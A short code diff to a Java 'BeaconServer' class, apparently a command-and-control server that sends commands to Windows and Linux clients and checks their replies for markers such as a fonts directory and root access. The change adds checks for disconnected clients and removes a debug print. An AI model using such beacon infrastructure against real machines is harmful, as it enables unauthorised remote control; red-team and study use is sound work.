@@ -170,8 +170,7 @@ public class BeaconServer implements Runnable{
         distributeCommands("Windows", "(pwd).path");
         for (String ip : windowsClientResponses.keySet()){
             if (windowsClientResponses.get(ip).size() != 0){
-                System.out.println(windowsClientResponses.toString());
-                if (windowsClientResponses.get(ip).contains("C:\\Windows\\fonts")){
+                if (windowsClientResponses.get(ip).contains("C:\\Windows\\fonts") && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
                     // If responses contains the string we just send a command to get, then remove it, and give it true
                     ArrayList<String> tempList = windowsClientResponses.get(ip);
                     tempList.remove("C:\\Windows\\fonts");
@@ -185,7 +184,7 @@ public class BeaconServer implements Runnable{
         // Check all Linux Boxes
         for (String ip : linuxClientResponses.keySet()){
             if (linuxClientResponses.get(ip).size() != 0){
-                if (linuxClientResponses.get(ip).contains("1. root")){
+                if (linuxClientResponses.get(ip).contains("1. root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
                     // If responses contains the string we just send a command to get, then remove it, and give it true
                     ArrayList<String> tempList = linuxClientResponses.get(ip);
                     tempList.remove("1. root");
